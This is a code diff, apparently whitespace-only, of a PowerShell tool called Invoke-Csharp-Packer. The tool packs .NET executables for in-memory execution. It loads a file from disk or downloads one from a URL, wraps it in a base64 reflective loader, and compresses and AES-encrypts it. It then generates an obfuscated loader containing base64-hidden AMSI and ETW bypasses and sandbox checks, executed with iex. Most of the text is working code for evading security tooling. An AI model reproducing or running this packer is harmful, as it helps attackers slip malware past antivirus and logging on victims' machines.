@@ -39,18 +39,18 @@ Features:
 
 function Invoke-Csharp-Packer {
 	
-	[CmdletBinding()]
-	Param (
+		[CmdletBinding()]
+		Param (
         [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $Filepath,
 		 
-        [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+		[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $Fileurl,
 		
         [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $Outfile = $(Throw("-OutFile is required")),
 		
-	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+		[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [switch] $Sandbox
 		)
 
@@ -58,28 +58,28 @@ function Invoke-Csharp-Packer {
 
         $TempNETAssemblyLoaderFile = "C:\Windows\Temp\templatefile.ps1"
         $NETAssemblyLoaderFilePart1 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("RnVuY3Rpb24gSW52b2tlLVBhY2tlZC1ORVQtRXhlY3V0YWJsZSB7CltDbWRsZXRCaW5kaW5nKCldClBhcmFtICgKW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZSxWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lKV0KW1N0cmluZ1tdXSRBcmd1bWVudHMgPSAiIgopCiRBc3NlbWJseV9kYXRhQjY0ID0gIg==")))		
-	$NETAssemblyLoaderFilePart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("Ig==")))
+		$NETAssemblyLoaderFilePart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("Ig==")))
         $NETAssemblyLoaderFilePart3 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGZvdW5kTWFpbiA9ICRmYWxzZQokRGVjb2RlZF9ORVRhc3NlbWJseSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEFzc2VtYmx5X2RhdGFCNjQpCQoKdHJ5IHsKCSRORVRhc3NlbWJseSA9IFtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkRGVjb2RlZF9ORVRhc3NlbWJseSkKCX0KY2F0Y2ggewoJV3JpdGUtT3V0cHV0ICJbIV0gQ291bGQgbm90IGxvYWQgYXNzZW1ibHkuIElzIGl0IGluIENPRkYvTVNJTC8uTkVUIGZvcm1hdD8iCgl0aHJvdwoJfQoJZm9yZWFjaCgkdHlwZSBpbiAkTkVUYXNzZW1ibHkuR2V0RXhwb3J0ZWRUeXBlcygpKSB7CgkJZm9yZWFjaCgkbWV0aG9kIGluICR0eXBlLkdldE1ldGhvZHMoKSkgewoJCQlpZigkbWV0aG9kLk5hbWUgLWVxICJNYWluIikgewoJCQkJJGZvdW5kTWFpbiA9ICR0cnVlCgkJCQlpZigkQXJndW1lbnRzWzBdIC1lcSAiIikgewoJCQkJCVdyaXRlLU91dHB1dCAiWypdIEF0dGVtcHRpbmcgdG8gbG9hZCB0aGUgQyMgYXNzZW1ibHkgd2l0aG91dCBhcmd1bWVudCIKCQkJCX0KCQkJCWVsc2UgewoJCQkJCVdyaXRlLU91dHB1dCAiWypdIEF0dGVtcHRpbmcgdG8gbG9hZCB0aGUgQyMgYXNzZW1ibHkgd2l0aCBhcmd1bWVudChzKTogJGFyZ3VtZW50cyIKCQkJCX0KCQkJCSRhID0gKCxbU3RyaW5nW11dQCgkQXJndW1lbnRzKSkKCQkJCQoJCQkJJHByZXZDb25PdXQgPSBbQ29uc29sZV06Ok91dAoJCQkJJHN3ID0gW0lPLlN0cmluZ1dyaXRlcl06Ok5ldygpCgkJCQlbQ29uc29sZV06OlNldE91dCgkc3cpCgkJCQkKCQkJCXRyeSB7CgkJCQkJJG1ldGhvZC5JbnZva2UoJG51bGwsICRhKQoJCQkJfQoJCQkJY2F0Y2ggewoJCQkJCVdyaXRlLU91dHB1dCAiWyFdIENvdWxkIG5vdCBpbnZva2UgdGhlIEMjIGFzc2VtYmx5IG9yIGl0IGNyYXNoZWQgZHVyaW5nIGV4ZWN1dGlvbiIKCQkJCQl0aHJvdwoJCQkJfQoJCQkJCgkJCQlbQ29uc29sZV06OlNldE91dCgkUHJldkNvbk91dCkKCQkJCSRvdXRwdXQgPSAkc3cuVG9TdHJpbmcoKQoJCQkJJG91dHB1dAoJCQl9CgkJfQoJfQoJaWYoISRmb3VuZE1haW4pIHsKCQlXcml0ZS1PdXRwdXQgIlshXSBDb3VsZCBub3QgZmluZCBwdWJsaWMgTWFpbigpIGZ1bmN0aW9uLiBEb2VzIHRoZSBuYW1lc3BhY2UgaXMgc2V0IGFzIHB1YmxpYz8iCgkJdGhyb3cKCX0KfQ==")))
 
         if ($Filepath) {
-	Write-Output "[*] Loading the .NET executable file: '$($Filepath)"
-	$Assembly_dataB64 = ([Convert]::ToBase64String([IO.File]::ReadAllBytes($Filepath)))
-	Write-Output "[*] Creating the .NET executable loader script"
-	[System.IO.File]::WriteAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart1);
-	[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $Assembly_dataB64);
-	[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart2 + "`r`n");
-	[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart3);		
-	}
-	elseif ($Fileurl){
-	Write-Output "[*] Downloading the remote .NET executable file: '$($Fileurl)'"
-	$NETassemblyfile = ([net.webclient]::new()).downloaddata($Fileurl)
-	$Assembly_dataB64 = [Convert]::ToBase64String($NETassemblyfile)
-	Write-Output "[*] Creating the .NET executable loader script"
-	[System.IO.File]::WriteAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart1);
-	[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $Assembly_dataB64);
-	[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart2 + "`r`n");
-	[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart3);	
-	}
+		Write-Output "[*] Loading the .NET executable file: '$($Filepath)"
+		$Assembly_dataB64 = ([Convert]::ToBase64String([IO.File]::ReadAllBytes($Filepath)))
+		Write-Output "[*] Creating the .NET executable loader script"
+		[System.IO.File]::WriteAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart1);
+		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $Assembly_dataB64);
+		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart2 + "`r`n");
+		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart3);		
+		}
+		elseif ($Fileurl){
+		Write-Output "[*] Downloading the remote .NET executable file: '$($Fileurl)'"
+		$NETassemblyfile = ([net.webclient]::new()).downloaddata($Fileurl)
+		$Assembly_dataB64 = [Convert]::ToBase64String($NETassemblyfile)
+		Write-Output "[*] Creating the .NET executable loader script"
+		[System.IO.File]::WriteAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart1);
+		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $Assembly_dataB64);
+		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart2 + "`r`n");
+		[System.IO.File]::AppendAllText($TempNETAssemblyLoaderFile, $NETAssemblyLoaderFilePart3);	
+		}
 		
         $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
         $paddingmode = $paddingmodes | Get-Random
@@ -93,13 +93,13 @@ function Invoke-Csharp-Packer {
         $compressiontype = $compressiontypes | Get-Random
 
         Write-Output "[*] File compression (GZip/Deflate)"
-	$TempNETAssemblyLoaderFileRead = [System.IO.File]::ReadAllBytes($TempNETAssemblyLoaderFile)
-	Del "C:\Windows\Temp\templatefile.ps1"
+		$TempNETAssemblyLoaderFileRead = [System.IO.File]::ReadAllBytes($TempNETAssemblyLoaderFile)
+		Del "C:\Windows\Temp\templatefile.ps1"
         [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
         if ($compressiontype -eq "Gzip") {
             $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
         } 
-	elseif ( $compressiontype -eq "Deflate") {
+		elseif ( $compressiontype -eq "Deflate") {
             $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
         }
       	$compressionStream.Write( $TempNETAssemblyLoaderFileRead, 0, $TempNETAssemblyLoaderFileRead.Length )
@@ -111,19 +111,19 @@ function Invoke-Csharp-Packer {
         if ($ciphermode -eq 'CBC') {
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
         } 
-	elseif ($ciphermode -eq 'ECB') {
+		elseif ($ciphermode -eq 'ECB') {
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
         }
         if ($paddingmode -eq 'PKCS7') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
         } 
-	elseif ($paddingmode -eq 'ISO10126') {
+		elseif ($paddingmode -eq 'ISO10126') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
         } 
-	elseif ($paddingmode -eq 'ANSIX923') {
+		elseif ($paddingmode -eq 'ANSIX923') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
         } 
-	elseif ($paddingmode -eq 'Zeros') {
+		elseif ($paddingmode -eq 'Zeros') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
         }
 
@@ -139,13 +139,13 @@ function Invoke-Csharp-Packer {
         $aesManaged.Dispose()
         $b64encrypted = [System.Convert]::ToBase64String($fullData)
         
-	$AssemblyLoaderFileFile = ''
+		$AssemblyLoaderFileFile = ''
         
-	if ($sandbox) {	
+		if ($sandbox) {	
         Write-Output "[*] Adding basic sandbox checks"
         $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
-	$AssemblyLoaderFileFile += $code_fixed_order1 -join ''
-	$code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
+		$AssemblyLoaderFileFile += $code_fixed_order1 -join ''
+		$code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order2 -join ''
         $code_fixed_order3 += 'iex(${18})' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order3 -join ''
@@ -156,13 +156,13 @@ function Invoke-Csharp-Packer {
         $AssemblyLoaderFileFile += $code_fixed_order4 -join ''
         $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order5 -join ''
-	$code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
+		$code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order6 -join ''
         $code_fixed_order7 += 'iex(${11})' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
-	$code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
+		$code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order8 -join ''
         $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
         $AssemblyLoaderFileFile += $code_fixed_order9 -join ''
@@ -204,7 +204,7 @@ function Invoke-Csharp-Packer {
         if ($compressiontype -eq "Gzip") {
             $AssemblyLoaderFileFile += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
         } 
-	elseif ( $compressiontype -eq "Deflate") {
+		elseif ( $compressiontype -eq "Deflate") {
             $AssemblyLoaderFileFile += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
         }
         $AssemblyLoaderFileFile += '${5}.CopyTo(${7})' + "`r`n"
